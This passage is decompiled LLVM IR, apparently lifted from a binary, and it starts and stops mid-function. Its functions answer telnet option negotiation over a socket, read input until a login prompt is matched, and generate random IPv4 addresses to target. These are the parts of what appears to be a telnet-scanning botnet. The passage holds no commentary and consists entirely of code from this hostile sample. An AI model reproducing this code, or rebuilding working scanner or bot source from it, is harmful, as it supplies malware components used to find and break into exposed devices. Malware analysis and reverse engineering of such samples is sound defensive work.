  br i1 %v7_a724, label %dec_label_pc_a870, label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %entry
  %v7_a734 = icmp eq i8 %v2_a718, -1
  br i1 %v7_a734, label %dec_label_pc_a738, label %dec_label_pc_a754

dec_label_pc_a738:                                ; preds = %dec_label_pc_a72c
  br label %dec_label_pc_a870

dec_label_pc_a754:                                ; preds = %dec_label_pc_a72c
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a770 = bitcast i8* %stack_var_-17 to i32*
  %v6_a770 = call i32 @__libc_send(i32 %arg1, i32* %v5_a770, i32 1, i32 16384)
  %v2_a77c = load i8, i8* %v1_a718, align 1
  %v7_a780 = icmp eq i8 %v2_a77c, -4
  br i1 %v7_a780, label %dec_label_pc_a788, label %dec_label_pc_a794

dec_label_pc_a788:                                ; preds = %dec_label_pc_a754
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a834

dec_label_pc_a794:                                ; preds = %dec_label_pc_a754
  %v2_a79c = load i8, i8* %v1_a718, align 1
  %v7_a7a0 = icmp eq i8 %v2_a79c, -2
  br i1 %v7_a7a0, label %dec_label_pc_a7a8, label %dec_label_pc_a7b4

dec_label_pc_a7a8:                                ; preds = %dec_label_pc_a794
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a834

dec_label_pc_a7b4:                                ; preds = %dec_label_pc_a794
  %v2_a7bc = load i8, i8* %v1_a718, align 1
  %v7_a7c0 = icmp eq i8 %v2_a7bc, 3
  %v7_a7d4 = icmp eq i8 %v2_a7bc, -3
  br i1 %v7_a7c0, label %dec_label_pc_a7c8, label %dec_label_pc_a800

dec_label_pc_a7c8:                                ; preds = %dec_label_pc_a7b4
  br i1 %v7_a7d4, label %dec_label_pc_a7dc, label %dec_label_pc_a7e8

dec_label_pc_a7dc:                                ; preds = %dec_label_pc_a7c8
  br label %dec_label_pc_a7f0

dec_label_pc_a7e8:                                ; preds = %dec_label_pc_a7c8
  br label %dec_label_pc_a7f0

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_a7dc, %dec_label_pc_a7e8
  %storemerge = phi i8 [ -3, %dec_label_pc_a7e8 ], [ -5, %dec_label_pc_a7dc ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a834

dec_label_pc_a800:                                ; preds = %dec_label_pc_a7b4
  br i1 %v7_a7d4, label %dec_label_pc_a814, label %dec_label_pc_a820

dec_label_pc_a814:                                ; preds = %dec_label_pc_a800
  br label %dec_label_pc_a828

dec_label_pc_a820:                                ; preds = %dec_label_pc_a800
  br label %dec_label_pc_a828

dec_label_pc_a828:                                ; preds = %dec_label_pc_a814, %dec_label_pc_a820
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a820 ], [ -4, %dec_label_pc_a814 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a834

dec_label_pc_a834:                                ; preds = %dec_label_pc_a7f0, %dec_label_pc_a7a8, %dec_label_pc_a788, %dec_label_pc_a828
  %v5_a848 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a770, i32 1, i32 16384)
  %v1_a850 = add i32 %arg2, 2
  %v4_a864 = inttoptr i32 %v1_a850 to i32*
  %v5_a864 = call i32 @__libc_send(i32 %arg1, i32* %v4_a864, i32 1, i32 16384)
  br label %dec_label_pc_a870

dec_label_pc_a870:                                ; preds = %dec_label_pc_a738, %dec_label_pc_a834, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a870, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a834, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a828, { 1, 0 }
  uselistorder label %dec_label_pc_a7f0, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a8a0 = call i32 @strlen(i8* %arg1)
  %v2_a8e8 = add i32 %v3_a8a0, %tmp
  br label %dec_label_pc_a9bc

dec_label_pc_a8c0:                                ; preds = %dec_label_pc_a948, %dec_label_pc_a924, %dec_label_pc_a900, %dec_label_pc_a8dc
  %v1_a8c4 = add nsw i32 %stack_var_-24.014, 1
  %v7_a8d8 = icmp sgt i32 %v3_a8a0, %v1_a8c4
  br i1 %v7_a8d8, label %dec_label_pc_a8dc, label %dec_label_pc_a96c

dec_label_pc_a8dc:                                ; preds = %dec_label_pc_a8cc.preheader, %dec_label_pc_a8c0
  %stack_var_-24.014 = phi i32 [ %v1_a8c4, %dec_label_pc_a8c0 ], [ %stack_var_-24.1, %dec_label_pc_a8cc.preheader ]
  %v2_a8f0 = sub i32 %v2_a8e8, %stack_var_-24.014
  %v1_a8f4 = inttoptr i32 %v2_a8f0 to i8*
  %v2_a8f4 = load i8, i8* %v1_a8f4, align 1
  %v2_a8f8 = icmp eq i8 %v2_a8f4, 0
  br i1 %v2_a8f8, label %dec_label_pc_a8c0, label %dec_label_pc_a900

dec_label_pc_a900:                                ; preds = %dec_label_pc_a8dc
  %v2_a918 = load i8, i8* %v1_a8f4, align 1
  %v7_a91c = icmp eq i8 %v2_a918, 32
  br i1 %v7_a91c, label %dec_label_pc_a8c0, label %dec_label_pc_a924

dec_label_pc_a924:                                ; preds = %dec_label_pc_a900
  %v2_a93c = load i8, i8* %v1_a8f4, align 1
  %v7_a940 = icmp eq i8 %v2_a93c, 13
  br i1 %v7_a940, label %dec_label_pc_a8c0, label %dec_label_pc_a948

dec_label_pc_a948:                                ; preds = %dec_label_pc_a924
  %v2_a960 = load i8, i8* %v1_a8f4, align 1
  %v7_a964 = icmp eq i8 %v2_a960, 10
  br i1 %v7_a964, label %dec_label_pc_a8c0, label %dec_label_pc_a96c

dec_label_pc_a96c:                                ; preds = %dec_label_pc_a948, %dec_label_pc_a8c0, %dec_label_pc_a8cc.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a8cc.preheader ], [ %stack_var_-24.014, %dec_label_pc_a948 ], [ %v1_a8c4, %dec_label_pc_a8c0 ]
  %v2_a980 = sub i32 %v2_a8e8, %stack_var_-24.0.lcssa
  %v1_a984 = inttoptr i32 %v2_a980 to i8*
  %v2_a984 = load i8, i8* %v1_a984, align 1
  %v2_a994 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_1e5e8.82 to i32)
  %v1_a998 = inttoptr i32 %v2_a994 to i8*
  %v2_a998 = load i8, i8* %v1_a998, align 1
  %v9_a99c = icmp eq i8 %v2_a984, %v2_a998
  %v1_a9b4 = add i32 %storemerge3, 1
  br i1 %v9_a99c, label %dec_label_pc_a9dc, label %dec_label_pc_a9bc

dec_label_pc_a9bc:                                ; preds = %dec_label_pc_a96c, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a96c ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a9b4, %dec_label_pc_a96c ]
  %v3_a9c4 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e5e8.82, i32 0, i32 0))
  %v3_a9cc = icmp ult i32 %storemerge3, %v3_a9c4
  br i1 %v3_a9cc, label %dec_label_pc_a8cc.preheader, label %dec_label_pc_a9dc

dec_label_pc_a8cc.preheader:                      ; preds = %dec_label_pc_a9bc
  %v7_a8d813 = icmp sgt i32 %v3_a8a0, %stack_var_-24.1
  br i1 %v7_a8d813, label %dec_label_pc_a8dc, label %dec_label_pc_a96c

dec_label_pc_a9dc:                                ; preds = %dec_label_pc_a9bc, %dec_label_pc_a96c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a96c ], [ 0, %dec_label_pc_a9bc ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a8a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a96c, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a9f4 = load i32, i32* @fp, align 4
  store i32 %v3_a9f4, i32* %stack_var_-16, align 4
  %v13_a9f4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_aa44 = ptrtoint i32* %stack_var_-168 to i32
  %v3_aa84 = udiv i32 %arg1, 32
  %v3_aa90 = mul nuw nsw i32 %v3_aa84, 4
  %v1_aaa8 = urem i32 %arg1, 32
  %v6_aab0 = shl i32 1, %v1_aaa8
  %v1_aad4 = add i32 %arg1, 1
  %v2_aadc = ptrtoint i32* %stack_var_-176 to i32
  %v6_abfc = inttoptr i32 %arg2 to i8*
  %v2_ac10 = icmp eq i32 %arg3, 0
  %v1_ac1c = inttoptr i32 %arg6 to i8*
  %v5_ac60 = icmp sgt i32 %arg5, 0
  %v2_aa98 = add nsw i32 %v3_aa90, -152
  %v2_aa9c = add i32 %v2_aa98, %v13_a9f4
  %v1_aaa0 = inttoptr i32 %v2_aa9c to i32*
  br label %dec_label_pc_ac38

dec_label_pc_aa58.lr.ph:                          ; preds = %dec_label_pc_ac4c, %dec_label_pc_ac58
  br label %dec_label_pc_aa58

dec_label_pc_aa58:                                ; preds = %dec_label_pc_aa58.lr.ph, %dec_label_pc_aa58
  %storemerge27 = phi i32 [ 0, %dec_label_pc_aa58.lr.ph ], [ %v1_aa6c, %dec_label_pc_aa58 ]
  %v5_aa64 = mul nuw nsw i32 %storemerge27, 4
  %v6_aa64 = add i32 %v5_aa64, %v2_aa44
  %v7_aa64 = inttoptr i32 %v6_aa64 to i32*
  store i32 0, i32* %v7_aa64, align 4
  %v1_aa6c = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_aa6c, 32
  br i1 %tmp30, label %dec_label_pc_aa58, label %dec_label_pc_aa80

dec_label_pc_aa80:                                ; preds = %dec_label_pc_aa58
  %v2_aaa0 = load i32, i32* %v1_aaa0, align 4
  %v2_aab4 = or i32 %v2_aaa0, %v6_aab0
  store i32 %v2_aab4, i32* %v1_aaa0, align 4
  %v5_aaf0 = call i32 @__libc_select(i32 %v1_aad4, i32 %v2_aa44, i32 0, i32 0, i32 %v2_aadc)
  %tmp31 = icmp slt i32 %v5_aaf0, 1
  br i1 %tmp31, label %dec_label_pc_ac7c, label %dec_label_pc_ab00

dec_label_pc_ab00:                                ; preds = %dec_label_pc_aa80
  %v2_ab0c = add i32 %stack_var_-40.0, %arg6
  %v5_ab10 = inttoptr i32 %v2_ab0c to i8*
  %v6_ab24 = inttoptr i32 %v2_ab0c to i32*
  %v7_ab24 = call i32 @__libc_recv(i32 %arg1, i32* %v6_ab24, i32 1, i32 0)
  %v7_ab34 = icmp eq i32 %v7_ab24, -1
  br i1 %v7_ab34, label %dec_label_pc_ab48, label %dec_label_pc_ab3c

dec_label_pc_ab3c:                                ; preds = %dec_label_pc_ab00
  %v2_ab40 = icmp eq i32 %v7_ab24, 0
  br i1 %v2_ab40, label %dec_label_pc_ab48, label %dec_label_pc_ab54

dec_label_pc_ab48:                                ; preds = %dec_label_pc_ab3c, %dec_label_pc_ab00
  br label %dec_label_pc_ac84

dec_label_pc_ab54:                                ; preds = %dec_label_pc_ab3c
  %v2_ab5c = add i32 %v7_ab24, %stack_var_-40.0
  %v2_ab68 = load i8, i8* %v5_ab10, align 1
  %v2_ab6c = icmp eq i8 %v2_ab68, -1
  br i1 %v2_ab6c, label %dec_label_pc_ab74, label %dec_label_pc_abf4

dec_label_pc_ab74:                                ; preds = %dec_label_pc_ab54
  %v1_ab78 = add i32 %v2_ab0c, 1
  %v5_ab8c = inttoptr i32 %v1_ab78 to i32*
  %v6_ab8c = call i32 @__libc_recv(i32 %arg1, i32* %v5_ab8c, i32 2, i32 0)
  %v7_ab9c = icmp eq i32 %v6_ab8c, -1
  br i1 %v7_ab9c, label %dec_label_pc_abb0, label %dec_label_pc_aba4

dec_label_pc_aba4:                                ; preds = %dec_label_pc_ab74
  %v2_aba8 = icmp eq i32 %v6_ab8c, 0
  br i1 %v2_aba8, label %dec_label_pc_abb0, label %dec_label_pc_abbc

dec_label_pc_abb0:                                ; preds = %dec_label_pc_aba4, %dec_label_pc_ab74
  br label %dec_label_pc_ac84

dec_label_pc_abbc:                                ; preds = %dec_label_pc_aba4
  %v2_abc4 = add i32 %v6_ab8c, %v2_ab5c
  %v5_abd8 = call i32 @negotiate(i32 %arg1, i32 %v2_ab0c, i32 3, i32 %v2_abc4, i32 %v2_abc4)
  %v2_abe0 = icmp eq i32 %v5_abd8, 0
  br i1 %v2_abe0, label %dec_label_pc_abe8, label %dec_label_pc_ac38

dec_label_pc_abe8:                                ; preds = %dec_label_pc_abbc
  br label %dec_label_pc_ac84

dec_label_pc_abf4:                                ; preds = %dec_label_pc_ab54
  %v7_abfc = call i32 @strstr(i32 %arg6, i8* %v6_abfc)
  %v2_ac04 = icmp eq i32 %v7_abfc, 0
  br i1 %v2_ac04, label %dec_label_pc_ac0c, label %dec_label_pc_ac70

dec_label_pc_ac0c:                                ; preds = %dec_label_pc_abf4
  br i1 %v2_ac10, label %dec_label_pc_ac38, label %dec_label_pc_ac18

dec_label_pc_ac18:                                ; preds = %dec_label_pc_ac0c
  %v2_ac1c = call i32 @matchPrompt(i8* %v1_ac1c)
  %v2_ac24 = icmp eq i32 %v2_ac1c, 0
  br i1 %v2_ac24, label %dec_label_pc_ac38, label %dec_label_pc_ac70

dec_label_pc_ac38:                                ; preds = %dec_label_pc_abbc, %dec_label_pc_ac18, %dec_label_pc_ac0c, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_abc4, %dec_label_pc_abbc ], [ %v2_ab5c, %dec_label_pc_ac0c ], [ %v2_ab5c, %dec_label_pc_ac18 ]
  %v1_ac3c = add i32 %stack_var_-40.0, 2
  %v6_ac48 = icmp slt i32 %v1_ac3c, %arg7
  br i1 %v6_ac48, label %dec_label_pc_ac4c, label %dec_label_pc_ac7c

dec_label_pc_ac4c:                                ; preds = %dec_label_pc_ac38
  %v3_ac4c = load i32, i32* %stack_var_-176, align 4
  %v5_ac54 = icmp sgt i32 %v3_ac4c, 0
  br i1 %v5_ac54, label %dec_label_pc_aa58.lr.ph, label %dec_label_pc_ac58

dec_label_pc_ac58:                                ; preds = %dec_label_pc_ac4c
  br i1 %v5_ac60, label %dec_label_pc_aa58.lr.ph, label %dec_label_pc_ac7c

dec_label_pc_ac70:                                ; preds = %dec_label_pc_abf4, %dec_label_pc_ac18
  br label %dec_label_pc_ac84

dec_label_pc_ac7c:                                ; preds = %dec_label_pc_aa80, %dec_label_pc_ac58, %dec_label_pc_ac38
  br label %dec_label_pc_ac84

dec_label_pc_ac84:                                ; preds = %dec_label_pc_ac70, %dec_label_pc_abe8, %dec_label_pc_abb0, %dec_label_pc_ab48, %dec_label_pc_ac7c
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_ac7c ], [ 1, %dec_label_pc_ac70 ], [ 0, %dec_label_pc_ab48 ], [ 0, %dec_label_pc_abb0 ], [ 0, %dec_label_pc_abe8 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_ab8c, { 1, 2, 0 }
  uselistorder i32 %v7_ab24, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_aa44, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_ac84, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ac7c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ac70, { 1, 0 }
  uselistorder label %dec_label_pc_ac38, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_aa58, { 1, 0 }
  uselistorder label %dec_label_pc_aa58.lr.ph, { 1, 0 }
}

define i32 @FindingRandomIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ac98 = load i32, i32* @fp, align 4
  store i32 44192, i32* %stack_var_-4, align 4
  %v2_ac9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ac9c, i32* @fp, align 4
  %v2_aca0 = ptrtoint i32* %stack_var_-36 to i32
  store i8 0, i8* bitcast (i32* @global_var_29923.85 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_29924.86 to i8*), align 4
  store i8 0, i8* @global_var_29925.87, align 1
  store i8 0, i8* @global_var_29926.88, align 1
  %v2_acd4 = call i32 @random()
  %v2_ace4 = srem i32 %v2_acd4, 255
  %v1_acf4 = trunc i32 %v2_ace4 to i8
  store i8 %v1_acf4, i8* bitcast (i32* @global_var_29923.85 to i8*), align 4
  %v3_acf8 = call i32 @random()
  %v2_ad08 = srem i32 %v3_acf8, 255
  %v1_ad18 = trunc i32 %v2_ad08 to i8
  store i8 %v1_ad18, i8* bitcast (i32* @global_var_29924.86 to i8*), align 4
  %v3_ad1c = call i32 @random()
  %v2_ad2c = srem i32 %v3_ad1c, 255
  %v1_ad3c = trunc i32 %v2_ad2c to i8
  store i8 %v1_ad3c, i8* @global_var_29925.87, align 1
  %v3_ad40 = call i32 @random()
  %v2_ad50 = srem i32 %v3_ad40, 255
  %v1_ad60 = trunc i32 %v2_ad50 to i8
  store i8 %v1_ad60, i8* @global_var_29926.88, align 1
  %v3_ad64 = call i32 @random()
  %v2_ad74 = srem i32 %v3_ad64, 247
  %v2_ad84 = icmp eq i32 %v2_ad74, 0
  br i1 %v2_ad84, label %dec_label_pc_ad8c, label %dec_label_pc_adb4

dec_label_pc_ad8c:                                ; preds = %entry
  %v3_ad98 = load i8, i8* @global_var_29925.87, align 1
  %v3_ada4 = load i8, i8* @global_var_29926.88, align 1
  %v4_adb0 = sext i8 %v3_ad98 to i32
  %v6_adb0 = sext i8 %v3_ada4 to i32
  %v8_adb0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([11 x i8]* @global_var_1e5f0.90 to i32), i32 %v4_adb0, i32 %v6_adb0, i32 0)
  br label %dec_label_pc_adb4

dec_label_pc_adb4:                                ; preds = %entry, %dec_label_pc_ad8c
  %v7_adb8 = icmp eq i32 %v2_ad74, 1
  br i1 %v7_adb8, label %dec_label_pc_adc0, label %dec_label_pc_ade8

dec_label_pc_adc0:                                ; preds = %dec_label_pc_adb4
  %v3_adcc = load i8, i8* @global_var_29925.87, align 1
  %v3_add8 = load i8, i8* @global_var_29926.88, align 1
  %v4_ade4 = sext i8 %v3_adcc to i32
  %v6_ade4 = sext i8 %v3_add8 to i32
  %v8_ade4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e5fc.92 to i32), i32 %v4_ade4, i32 %v6_ade4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ade8

dec_label_pc_ade8:                                ; preds = %dec_label_pc_adb4, %dec_label_pc_adc0
  %v7_adec = icmp eq i32 %v2_ad74, 2
  br i1 %v7_adec, label %dec_label_pc_adf4, label %dec_label_pc_ae1c

dec_label_pc_adf4:                                ; preds = %dec_label_pc_ade8
  %v3_ae00 = load i8, i8* @global_var_29925.87, align 1
  %v3_ae0c = load i8, i8* @global_var_29926.88, align 1
  %v4_ae18 = sext i8 %v3_ae00 to i32
  %v6_ae18 = sext i8 %v3_ae0c to i32
  %v8_ae18 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e608.94 to i32), i32 %v4_ae18, i32 %v6_ae18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae1c

dec_label_pc_ae1c:                                ; preds = %dec_label_pc_ade8, %dec_label_pc_adf4
  %v7_ae20 = icmp eq i32 %v2_ad74, 3
  br i1 %v7_ae20, label %dec_label_pc_ae28, label %dec_label_pc_ae50

dec_label_pc_ae28:                                ; preds = %dec_label_pc_ae1c
  %v3_ae34 = load i8, i8* @global_var_29925.87, align 1
  %v3_ae40 = load i8, i8* @global_var_29926.88, align 1
  %v4_ae4c = sext i8 %v3_ae34 to i32
  %v6_ae4c = sext i8 %v3_ae40 to i32
  %v8_ae4c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e614.96 to i32), i32 %v4_ae4c, i32 %v6_ae4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae50

dec_label_pc_ae50:                                ; preds = %dec_label_pc_ae1c, %dec_label_pc_ae28
  %v7_ae54 = icmp eq i32 %v2_ad74, 4
  br i1 %v7_ae54, label %dec_label_pc_ae5c, label %dec_label_pc_ae84

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae50
  %v3_ae68 = load i8, i8* @global_var_29925.87, align 1
  %v3_ae74 = load i8, i8* @global_var_29926.88, align 1
  %v4_ae80 = sext i8 %v3_ae68 to i32
  %v6_ae80 = sext i8 %v3_ae74 to i32
  %v8_ae80 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e620.98 to i32), i32 %v4_ae80, i32 %v6_ae80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae84

dec_label_pc_ae84:                                ; preds = %dec_label_pc_ae50, %dec_label_pc_ae5c
  %v7_ae88 = icmp eq i32 %v2_ad74, 5
  br i1 %v7_ae88, label %dec_label_pc_ae90, label %dec_label_pc_aeb8

dec_label_pc_ae90:                                ; preds = %dec_label_pc_ae84
  %v3_ae9c = load i8, i8* @global_var_29925.87, align 1
  %v3_aea8 = load i8, i8* @global_var_29926.88, align 1
  %v4_aeb4 = sext i8 %v3_ae9c to i32
  %v6_aeb4 = sext i8 %v3_aea8 to i32
  %v8_aeb4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e62c.100 to i32), i32 %v4_aeb4, i32 %v6_aeb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aeb8

dec_label_pc_aeb8:                                ; preds = %dec_label_pc_ae84, %dec_label_pc_ae90
  %v7_aebc = icmp eq i32 %v2_ad74, 6
  br i1 %v7_aebc, label %dec_label_pc_aec4, label %dec_label_pc_aeec

dec_label_pc_aec4:                                ; preds = %dec_label_pc_aeb8
  %v3_aed0 = load i8, i8* @global_var_29925.87, align 1
  %v3_aedc = load i8, i8* @global_var_29926.88, align 1
  %v4_aee8 = sext i8 %v3_aed0 to i32
  %v6_aee8 = sext i8 %v3_aedc to i32
  %v8_aee8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e638.102 to i32), i32 %v4_aee8, i32 %v6_aee8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aeec

dec_label_pc_aeec:                                ; preds = %dec_label_pc_aeb8, %dec_label_pc_aec4
  %v7_aef0 = icmp eq i32 %v2_ad74, 7
  br i1 %v7_aef0, label %dec_label_pc_aef8, label %dec_label_pc_af20

dec_label_pc_aef8:                                ; preds = %dec_label_pc_aeec
  %v3_af04 = load i8, i8* @global_var_29925.87, align 1
  %v3_af10 = load i8, i8* @global_var_29926.88, align 1
  %v4_af1c = sext i8 %v3_af04 to i32
  %v6_af1c = sext i8 %v3_af10 to i32
  %v8_af1c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e648.104 to i32), i32 %v4_af1c, i32 %v6_af1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af20

dec_label_pc_af20:                                ; preds = %dec_label_pc_aeec, %dec_label_pc_aef8
  %v7_af24 = icmp eq i32 %v2_ad74, 8
  br i1 %v7_af24, label %dec_label_pc_af2c, label %dec_label_pc_af54

dec_label_pc_af2c:                                ; preds = %dec_label_pc_af20
  %v3_af38 = load i8, i8* @global_var_29925.87, align 1
  %v3_af44 = load i8, i8* @global_var_29926.88, align 1
  %v4_af50 = sext i8 %v3_af38 to i32
  %v6_af50 = sext i8 %v3_af44 to i32
  %v8_af50 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e658.106 to i32), i32 %v4_af50, i32 %v6_af50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af54

dec_label_pc_af54:                                ; preds = %dec_label_pc_af20, %dec_label_pc_af2c
  %v7_af58 = icmp eq i32 %v2_ad74, 9
  br i1 %v7_af58, label %dec_label_pc_af60, label %dec_label_pc_af88

dec_label_pc_af60:                                ; preds = %dec_label_pc_af54
  %v3_af6c = load i8, i8* @global_var_29925.87, align 1
  %v3_af78 = load i8, i8* @global_var_29926.88, align 1
  %v4_af84 = sext i8 %v3_af6c to i32
  %v6_af84 = sext i8 %v3_af78 to i32
  %v8_af84 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e668.108 to i32), i32 %v4_af84, i32 %v6_af84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af88

dec_label_pc_af88:                                ; preds = %dec_label_pc_af54, %dec_label_pc_af60
  %v7_af8c = icmp eq i32 %v2_ad74, 10
  br i1 %v7_af8c, label %dec_label_pc_af94, label %dec_label_pc_afbc

dec_label_pc_af94:                                ; preds = %dec_label_pc_af88
  %v3_afa0 = load i8, i8* @global_var_29925.87, align 1
  %v3_afac = load i8, i8* @global_var_29926.88, align 1
  %v4_afb8 = sext i8 %v3_afa0 to i32
  %v6_afb8 = sext i8 %v3_afac to i32
  %v8_afb8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e678.110 to i32), i32 %v4_afb8, i32 %v6_afb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afbc

dec_label_pc_afbc:                                ; preds = %dec_label_pc_af88, %dec_label_pc_af94
  %v7_afc0 = icmp eq i32 %v2_ad74, 11
  br i1 %v7_afc0, label %dec_label_pc_afc8, label %dec_label_pc_aff0

dec_label_pc_afc8:                                ; preds = %dec_label_pc_afbc
  %v3_afd4 = load i8, i8* @global_var_29925.87, align 1
  %v3_afe0 = load i8, i8* @global_var_29926.88, align 1
  %v4_afec = sext i8 %v3_afd4 to i32
  %v6_afec = sext i8 %v3_afe0 to i32
  %v8_afec = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e688.112 to i32), i32 %v4_afec, i32 %v6_afec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aff0

dec_label_pc_aff0:                                ; preds = %dec_label_pc_afbc, %dec_label_pc_afc8
  %v7_aff4 = icmp eq i32 %v2_ad74, 12
  br i1 %v7_aff4, label %dec_label_pc_affc, label %dec_label_pc_b024

dec_label_pc_affc:                                ; preds = %dec_label_pc_aff0
  %v3_b008 = load i8, i8* @global_var_29925.87, align 1
  %v3_b014 = load i8, i8* @global_var_29926.88, align 1
  %v4_b020 = sext i8 %v3_b008 to i32
  %v6_b020 = sext i8 %v3_b014 to i32
  %v8_b020 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e698.114 to i32), i32 %v4_b020, i32 %v6_b020, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b024

dec_label_pc_b024:                                ; preds = %dec_label_pc_aff0, %dec_label_pc_affc
  %v7_b028 = icmp eq i32 %v2_ad74, 13
  br i1 %v7_b028, label %dec_label_pc_b030, label %dec_label_pc_b058

dec_label_pc_b030:                                ; preds = %dec_label_pc_b024
  %v3_b03c = load i8, i8* @global_var_29925.87, align 1
  %v3_b048 = load i8, i8* @global_var_29926.88, align 1
  %v4_b054 = sext i8 %v3_b03c to i32
  %v6_b054 = sext i8 %v3_b048 to i32
  %v8_b054 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e6a8.116 to i32), i32 %v4_b054, i32 %v6_b054, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b058

dec_label_pc_b058:                                ; preds = %dec_label_pc_b024, %dec_label_pc_b030
  %v7_b05c = icmp eq i32 %v2_ad74, 14
  br i1 %v7_b05c, label %dec_label_pc_b064, label %dec_label_pc_b08c

dec_label_pc_b064:                                ; preds = %dec_label_pc_b058
  %v3_b070 = load i8, i8* @global_var_29925.87, align 1
  %v3_b07c = load i8, i8* @global_var_29926.88, align 1
  %v4_b088 = sext i8 %v3_b070 to i32
  %v6_b088 = sext i8 %v3_b07c to i32
  %v8_b088 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e6b8.118 to i32), i32 %v4_b088, i32 %v6_b088, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b08c

dec_label_pc_b08c:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b064
  %v7_b090 = icmp eq i32 %v2_ad74, 15
  br i1 %v7_b090, label %dec_label_pc_b098, label %dec_label_pc_b0c0

dec_label_pc_b098:                                ; preds = %dec_label_pc_b08c
  %v3_b0a4 = load i8, i8* @global_var_29925.87, align 1
